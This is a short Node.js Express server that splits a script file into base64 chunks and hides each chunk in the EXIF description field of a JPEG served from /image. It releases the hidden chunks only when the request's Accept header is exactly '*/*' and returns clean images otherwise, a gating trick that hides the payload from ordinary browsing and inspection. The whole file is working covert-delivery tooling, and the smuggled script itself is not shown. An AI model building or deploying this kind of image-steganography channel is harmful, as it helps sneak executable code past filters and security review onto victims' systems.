const express = require('express');
const fs = require('fs');
const piexif = require("piexifjs");


// image to embed hidden script into
let imagePath = './image.jpg';
// script to embed into image
let scriptPath = './demo.js';
// port to run server on
let port = 3000;




function turnStringIntoArray(pathString) {
    let bigstring = fs.readFileSync(pathString);
    let bigstringArray = [];
    for(let i = 0; i < bigstring.length; i += 10240) {
        bigstringArray.push(bigstring.toString('base64', i, i + 10240));
    }
    return bigstringArray;
}

function createImage(chunk) {
    let jpeg = fs.readFileSync(imagePath);
    let jpegString = jpeg.toString("binary");
    let zeroth = {};
    zeroth[piexif.ImageIFD.ImageDescription] = chunk;
    let exif = {};
    let gps = {};
    let exifObj = { "0th": zeroth, "Exif": exif, "GPS": gps };
    let exifBytes = piexif.dump(exifObj);
    let newData = piexif.insert(exifBytes, jpegString);
    let newJpeg = Buffer.from(newData, "binary");
    return newJpeg;
}

let bigstringArray = turnStringIntoArray(scriptPath);
let counter = 0;

const app = express();

app.get('/image', (req, res) => {
    if (counter < bigstringArray.length) {
        // dont send image if Accept header is not image/jpeg
        if (req.headers.accept != "*/*") {
            res.send(createImage(''))
            return;
        }
        res.send(createImage(bigstringArray[counter]));
        counter++;
        console.log(`Sent image ${counter} of ${bigstringArray.length}`);
    } else {
        res.status(404).send("No more images.");
    }
});

app.get('/reset', (req, res) => {
    counter = 0;
    res.send("Reset counter.");
    console.log(`client reset counter`);
});

app.get('/', (req, res) => {
    res.sendFile(__dirname + "/index.html");
});

app.listen(port, () => {
    console.log(`Server listening on port ${port}!`);
});